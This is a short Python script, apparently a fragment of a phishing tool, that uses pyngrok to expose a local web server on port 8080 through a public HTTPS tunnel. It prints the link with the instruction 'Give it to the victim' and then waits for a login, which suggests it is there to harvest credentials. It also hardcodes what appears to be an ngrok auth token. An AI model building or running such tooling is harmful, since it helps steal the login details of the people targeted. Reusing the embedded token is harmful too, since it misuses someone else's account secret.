from pyngrok import ngrok,conf
from colorama import Fore as color 
import os, sys
from time import sleep


bold = '\033[1m'
endbold = '\033[0m'


def linkgenerator():
    ngrok.set_auth_token('1mst0lqrE8EuLmovPSQrVXBA7La_6BKoXSejE7avNfqE2Uv8A')
    conf.get_default().region = "eu"
    link = ngrok.connect(8080, 'http')
    new_link = str(link).replace('http', 'https')
    new_link = new_link.split(" ")
    print(bold+color.CYAN+"[*] Give it to the victim   => "+color.RED+new_link[1]+endbold)
    print(color.LIGHTYELLOW_EX+'\n[*] Wait For a login....')